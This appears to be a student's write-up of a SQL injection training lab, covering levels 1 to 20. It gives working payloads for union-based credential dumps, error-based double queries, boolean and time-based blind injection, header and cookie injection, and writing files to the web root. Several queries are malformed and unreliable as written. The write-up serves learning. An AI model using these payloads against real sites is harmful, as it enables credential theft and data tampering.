# SQLI-WRITEUPS                      
                                       
**Level-1**                                     
![Screenshot_2024-04-01_07-22-36](https://github.com/komalrao1/Bi0s_Blockchain/assets/147682987/e8e398cf-c59f-4afa-b0dc-b06c0115ac80)                                 
- In this level the error caused in sql query is due to single quote. if we observe the above error we can find that by commenting after the quote we can fix the query.Then after we can send our queries to fetch data from the database.                            
![Screenshot_2024-04-01_18-11-39](https://github.com/komalrao1/Bi0s_Blockchain/assets/147682987/bbf9bd63-589b-47b4-a09e-b6f9e82d7af0)                                      
**Error: '**              
**Fixing: '--+**                               
**Query:** *UNION SELECT 1,USERNAME,PASSWORD FROM USERS WHERE ID=3 LIMIT 1,1*                              
                               
**Level-2**                                                                           
![Screenshot_2024-04-01_18-21-55](https://github.com/komalrao1/Bi0s_Blockchain/assets/147682987/d640e76e-054f-4b61-95ee-33fa671211a6)                                
- In this level actually there is no error by commenting out everything after the id it works fine and we cans end our queries to get data.             
**Error: No Error**                        
**Fixing: ?id=1--+**                            
**Query:** *UNION SELECT 1,GROUP_CONCAT(USERNAME),GROUP_CONCAT(PASSWORD) FROM USERS --+*                           
                                             
**Level-3**                                               
![Screenshot_2024-04-01_18-27-00](https://github.com/komalrao1/Bi0s_Blockchain/assets/147682987/611e6831-0e37-4ce8-9a2e-357f2e991ee4)                    
- In this level the error is due to single quote . we can fix the error by placing a single quote and parenthes and then by commenting out the remaing query will fix the error and help us to make our own queries                   
![Screenshot_2024-04-01_18-27-44](https://github.com/komalrao1/Bi0s_Blockchain/assets/147682987/5bee9d0f-8034-4d8a-8f7b-c2f30bf37fac)                            
**Error:  '    id'   ')**                            
**Fixing:  ?id=1')--+**                      
                                    
**Level-4**                                              
![Screenshot_2024-04-01_19-24-34](https://github.com/komalrao1/Bi0s_Blockchain/assets/147682987/c9099fa5-993b-49a9-b45a-309da68b53bc)                                      
- In this level the error is same as the previous level but doublequote is sued instead of single quote                  
![Screenshot_2024-04-01_19-25-32](https://github.com/komalrao1/Bi0s_Blockchain/assets/147682987/e3168cfb-ec4b-4325-8a6f-b3994b929071)                           
**Error:  "     id"    ")**            
**Fixing: ?id=1")--+**                  
                                        
**Level-5**                                                  
![Screenshot_2024-04-01_19-46-01](https://github.com/komalrao1/Bi0s_Blockchain/assets/147682987/21045cbe-b293-417b-b07c-2665f819942c)                                 
- In this level the webpage doesnot show any query results in the webpage so we cannot display query data in webpage . but it displays an error. using that we can send double query injection to give us the data in the error statement.                      
![Screenshot_2024-04-01_19-47-51](https://github.com/komalrao1/Bi0s_Blockchain/assets/147682987/cda1b4f6-67c6-45f0-afb4-fe566d296049)                                 
**Error: ' id' '**                      
**Fixing: ?id=1'--+**              
**Query:** *select count(*),(concat("~",(select database()),"~",floor(rand()*2)))a from information_schema.tables group by a*                         
                                       
**Level-6**                          
![Screenshot_2024-04-01_20-42-44](https://github.com/komalrao1/Bi0s_Blockchain/assets/147682987/de5946ae-9b7b-45b5-9629-81427428fb28)                                 
- In this level the error is same as level-5 but instead of single quotes double quotes is used in this level. After breaking and fixing the query the remaining part is same as Level-5        
![Screenshot_2024-04-01_20-42-28](https://github.com/komalrao1/Bi0s_Blockchain/assets/147682987/c43f3dc5-f442-4d16-8db7-9dcc551a67a2)                        
**Error: '"   id"   "'**                        
**Fixing: ?id=1"--+**                            
**Query:** *select count(*),(concat("~",(select database()),"~",floor(rand()*2)))a from information_schema.tables group by a*                    
                                              
**Level-7**                              
![Screenshot_2024-04-01_21-08-16](https://github.com/komalrao1/Bi0s_Blockchain/assets/147682987/4defc0be-6bc4-40e2-a0a7-755d7a94624f)                          
- In this level if there is any error it doesnt display the exact error it will only display a error message . so we need to try for breaking and fixing the error using all error queries like singlequotes,doublequotes and parenthes. once it is breaked then we need to fix and write our query. After fixing the error we can write the dumpfile query to result the ouput in otherfille.This is also a semi blind injection.                                                       
![Screenshot_2024-04-01_21-10-00](https://github.com/komalrao1/Bi0s_Blockchain/assets/147682987/41f5519a-8ef0-4c0c-8e5e-3af0a4f1947a)                          
**Error: (('   id '))   '))**                                         
**Fixing: ?id=1'))--+**                                           
**Query:** *union select 1,username,password from users into outfile "/var/www/html/Less-8/union.txt"*                              
                            
**Level-8**           
![Screenshot_2024-04-01_21-54-59](https://github.com/komalrao1/Bi0s_Blockchain/assets/147682987/09a64795-b172-40d9-928c-75fba614f3d9)                              
- In this level the webpage doesnot show any message even if we occur any error in the query . but if the query is successful we will get some msg. using this we can send boolean based sql queries. if the condition is true we will see the msg in webpage else we wont see any msg. This type of attacks is called blind boolean based sqli injection                        
![Screenshot_2024-04-01_21-55-40](https://github.com/komalrao1/Bi0s_Blockchain/assets/147682987/70dc94ec-9503-4193-af3d-d004349921da)                 
**Error: '    id'   '**            
**Fixing:  ?id=1'--+**
**Query:** *AND (ascii(substr((SELECT password from users where username='Dumb'),1,1))>90)**                                    
- If the above condition is true then it returns 1 and then 1 and 1 becomes true so we will login.                         
                                     
**Level-9**                                    
![Screenshot_2024-04-01_22-25-20](https://github.com/komalrao1/Bi0s_Blockchain/assets/147682987/3b601c1e-b74f-49ba-9dd4-48f0820d68e4)                              
- In this level we cannot find any difference whether we enter correct id number or not always the message is same. We can try all error method and along with them we should use sleep, so that if one of the error is broken and fixed then used sleep(), then the webpage wont display the the conent for next n seconds that is defined in sleep().                         
![Screenshot_2024-04-01_22-26-39](https://github.com/komalrao1/Bi0s_Blockchain/assets/147682987/908cd45d-43fb-4770-bb3e-51d2bd2909b3)                               
**Error: '    id'    '**                                                        
**Fixing:   ?id=1'--+**                                                       
**Query:** *and (if((SELECT SUBSTR(table_name,1,1) from information_schema.tables where table_schema="security" limit 0,1=e,sleep(10),null))*                               
                                 
**Level-10**                              
![Screenshot_2024-04-01_23-01-06](https://github.com/komalrao1/Bi0s_Blockchain/assets/147682987/b92d685f-d9ff-4afa-a8ff-ced16d2c6194)                                   
- This query is same as level-9. The only difference is instead of single quotes double quotes is used.              
![Screenshot_2024-04-01_23-01-29](https://github.com/komalrao1/Bi0s_Blockchain/assets/147682987/86e378ce-89f7-4264-a247-b8dec8ff0486)                           
**Error: " id "  "**                                
**Fixing: ?id=1" --+**                                    
**Query:** *and (if((SELECT SUBSTR(table_name,1,1) from information_schema.tables where table_schema="security" limit 0,1=e,sleep(10),null))*                              
                                             
**Level-11**                       
![Screenshot_2024-04-01_23-44-59](https://github.com/komalrao1/Bi0s_Blockchain/assets/147682987/de5b1d38-42d7-4bd9-b75d-5b70b706c773)                                           
- In this level the username and password is sent in apost request. Once if we acheive breaking and fixing the query which helps us in retrieving data from database then we can pass any of the query using this. since it is displaying data on webpage we can use union attack, since it is displaying error in webpage we can user dobule query injections. we can use blind injection.                                               
![Screenshot_2024-04-01_23-45-52](https://github.com/komalrao1/Bi0s_Blockchain/assets/147682987/7bfb5272-f289-4225-9c6d-ad146a67ab5b)                                                     
**Error: '   username'    '**              
**Fixing: username' or 1=1 #**                   
**Query:** *SELECT USERNAME,PASSWORD FROM USERS WHERE LIMIT 1,1*                   
                                  
**Level-12**                        
![Screenshot_2024-04-02_00-00-07](https://github.com/komalrao1/Bi0s_Blockchain/assets/147682987/c74f67f4-3a38-4922-8beb-6189d51f642a)                      
- This level is same as the above level the only difference is while breaking the query we use a double quote and parenthes instead of single quote.                          
![Screenshot_2024-04-02_00-05-30](https://github.com/komalrao1/Bi0s_Blockchain/assets/147682987/05d1f34d-ad8c-4223-aa24-df5c316cfe6c)                            
**Error: ("   username")    ")**              
**Fixing: username") or 1=1 #**                   
**Query:** *SELECT USERNAME,PASSWORD FROM USERS WHERE LIMIT 1,1*              
                                       
**Level-13**                
![Screenshot_2024-04-02_00-27-13](https://github.com/komalrao1/Bi0s_Blockchain/assets/147682987/d6464ae1-ba3c-448e-8008-da2c35ec4f13)                   
- In this level after loging in it is not displaying the username and password . so here we need to make a double injection since it is displaying the entire error in the webpage.                       
![Screenshot_2024-04-02_00-36-02](https://github.com/komalrao1/Bi0s_Blockchain/assets/147682987/1e94d644-c193-43ae-9299-8eb1b1d95193)                                   
**Error: ('    username')    ')**                
**Fixing: username') or 1=1 #**               
**Query:** *') union (select 1 from (select count(*),(concat("~",(select database()),"~",floor(rand()*2)))a from information_schema.tables group by a)b)#*                             
                                       
**Level-14**                
![Screenshot_2024-04-02_08-48-05](https://github.com/komalrao1/Bi0s_Blockchain/assets/147682987/35cf5a35-e385-44f6-a0ba-d071a62f4858)                           
- In this level the query can be broken by using combination of a singlequote and a doublequote. Then we can fix the error by commenting out rrst of the thing.                            
![Screenshot_2024-04-02_08-49-31](https://github.com/komalrao1/Bi0s_Blockchain/assets/147682987/360915bc-af1e-4a72-bbbd-1e90f062db33)                                          
**Error: '"     username'"     '"**                    
**Fixing: username'" or 1=1 #**                         
**Query** *union (select 1,1 from (select count(*),(concat("~",(select database()),"~",floor(rand()*2)))a from information_schema.tables group by a)b)#*                     
                                      
**Less-15**                  
![Screenshot_2024-04-02_18-24-38](https://github.com/komalrao1/Bi0s_Blockchain/assets/147682987/3ab6d917-e53d-44a7-a08c-b61ec744b899)                        
- In this level the query is breaken by single quote, but it doesnt display any error. after fixing the query using boolean conditions if it works we can confirm that it is the error. To confirm i have used or 1=1 which is always true. so if it works with the broken query then it is fixed.                      
- Later we can use other queries to get information from the database.                                                         
![Screenshot_2024-04-02_18-24-01](https://github.com/komalrao1/Bi0s_Blockchain/assets/147682987/4045798d-4088-45df-b252-e66a280481c3)                                        
![Screenshot_2024-04-02_18-23-05](https://github.com/komalrao1/Bi0s_Blockchain/assets/147682987/61a4f19e-757d-423b-8c30-08bd14c7caad)                             
**Error:  '  username'    '**                   
**Fixing: username' or 1=1# => which will make us to login**                                    
**Query:** *' or (select database())='security' #*                        
                           
**Less-16**                                    
![Screenshot_2024-04-02_18-33-17](https://github.com/komalrao1/Bi0s_Blockchain/assets/147682987/af241227-2efe-42e8-b905-5342a8c9b0d5)                                  
- In this level the query part is same as Less-15 but the only difference is the breaking anf fixing of error. Here error can be fixed by using a double quote and parenthes.                 
- We can also send time based queries for this level                                   
![Screenshot_2024-04-02_18-34-14](https://github.com/komalrao1/Bi0s_Blockchain/assets/147682987/6fd843a7-5dbe-4546-b5f7-aa05b27eae80)                             
**Error: ("     username")       ")**                                    
**Fixing: username") or 1=1#**                         
**Query:** *' or (select database())='security' #*                                
**Less-17**                              
![Screenshot_2024-04-02_19-53-14](https://github.com/komalrao1/Bi0s_Blockchain/assets/147682987/568d1efa-b6e9-424d-8a37-359873065831)                         
- In this it is a password updation page. it doesnot interact with us it only displays a message if the password updation is sucessful. It also displays an error if we enter username and try password singlequotes.                        
- after breaking we can fix the query and we can use double injection to display our messages in that error message.              
- the backend query is like **UPDATE USERS SET PASSWORD='password' WHERE USERNAME='username'**                      
- After breaking and fixing it will become **UPDATE USERS SET PASSWORD='password' or 1=1 # ' WHERE USERNAME='username'**                        
![Screenshot_2024-04-02_19-56-37](https://github.com/komalrao1/Bi0s_Blockchain/assets/147682987/cf3530b9-7544-4307-8e88-5c0906728bd7)                                      
![Screenshot_2024-04-02_19-57-04](https://github.com/komalrao1/Bi0s_Blockchain/assets/147682987/922aab84-d732-40ff-97e7-7cae953c511d)                                         
**Error: '    password'    '**                                
**Fixing: password' or 1=1**                           
**Query** *' AND (select 1 from (select count(*),(concat("~",(select database()),"~",floor(rand()*2)))a from information_schema.tables group by a)b)#*                                     
**Less-18**                              
![Screenshot_2024-04-02_21-33-20](https://github.com/komalrao1/Bi0s_Blockchain/assets/147682987/520fe32f-b5a2-4c80-8647-f62eeb73b817)                           
- In this level the form data is filtered. So we cannot inject the queries in the formdata. But once we login with a username and password we can observe it is showing the **User-Agent**. So by seeing this we can conclude that we can break the query. we can  try breaking the useragent query usingthe burp suite.                           
![Screenshot_2024-04-02_21-40-29](https://github.com/komalrao1/Bi0s_Blockchain/assets/147682987/dd2758d0-bdc4-4d17-b08f-c015711d0236)                               
- We can observe that by placing a single quote it is displaying an error. So we can fix the error and we can make it use to send sql queries.                             
![Screenshot_2024-04-02_21-41-29](https://github.com/komalrao1/Bi0s_Blockchain/assets/147682987/5041e198-c774-4f8c-9ffa-1ee53c4aeae8)                            
- Since it is displaying the errors we can use double injections to find errors.                                
![Screenshot_2024-04-02_21-31-55](https://github.com/komalrao1/Bi0s_Blockchain/assets/147682987/0f062521-ca40-4d95-8be5-bafc4fcc70ca)                               
**Error: ('     uagent'    ')**                        
**Fixing: uagent',1,1) #**                             
**Query:** *',(select 1 from (select count(*),(concat("~",(select database()),"~",floor(rand()*2)))a from information_schema.tables group by a)b),1)#*                      
**Less-19**                               
![Screenshot_2024-04-02_21-53-30](https://github.com/komalrao1/Bi0s_Blockchain/assets/147682987/b331db6e-55ae-48e3-b8ff-8e7064efea49)                                                  
- In this level the form data is filtered. so we cannot inject the queries in formdata. But once we login with a username and password we can observe it is showing the **Referer**. So by seeing this we can conclude that we can break the query. we can  try breaking the Referer query usingthe burp suite.                            
![Screenshot_2024-04-02_21-57-21](https://github.com/komalrao1/Bi0s_Blockchain/assets/147682987/0327351a-3f78-4b89-b5be-f0e7eb4b03f0)                                                            
- We can observe that by placing a single quote it is displaying an error. So we can fix the error and we can make it use to send sql queries.                
![Screenshot_2024-04-02_21-59-07](https://github.com/komalrao1/Bi0s_Blockchain/assets/147682987/a5ed359e-3f88-47c2-9958-20f4bc0e4e6d)                                            
- Now after fixing it is not showing any error. Now we can use double injection go get data from the database.                  
![Screenshot_2024-04-02_22-02-31](https://github.com/komalrao1/Bi0s_Blockchain/assets/147682987/8784e27c-af40-44ad-9334-0f5428cd8f87)                           
                                                                                          
**Less-20**                                      
![Screenshot_2024-04-02_22-04-57](https://github.com/komalrao1/Bi0s_Blockchain/assets/147682987/b7049a19-1c64-4079-9285-0ed97c7581f9)                                          
- In this level the form data is filtered. so we cannot inject the queries in formdata. But once we login with a username and password we can observe it is showing the **cookie*. So by seeing this we can conclude that we can break the query. we can  try breaking the cookie query usingthe burp suite.                                      
![Screenshot_2024-04-02_22-09-58](https://github.com/komalrao1/Bi0s_Blockchain/assets/147682987/05d5d27e-f8db-4726-b245-8a4cd655e16c)                                          
- We can observe by placing a singlw quote the query is breaked and then after by fixing the broken query we can write our queries to fetch data from the database.               
![Screenshot_2024-04-02_22-13-18](https://github.com/komalrao1/Bi0s_Blockchain/assets/147682987/135e9956-b70f-4d87-8e3b-2e7547062bd6)                                              
**Error: ' cookie' '**                           
**Fixing: cookie',ip)#**                     
**Query:** *uname=admin' UNION (SELECT 1,group_concat(username),group_concat(password) from users) limit 1,1#*                        
                                    
                  
    -----------------------------------------------------------------**THE END**-----------------------------------------------------------------                   
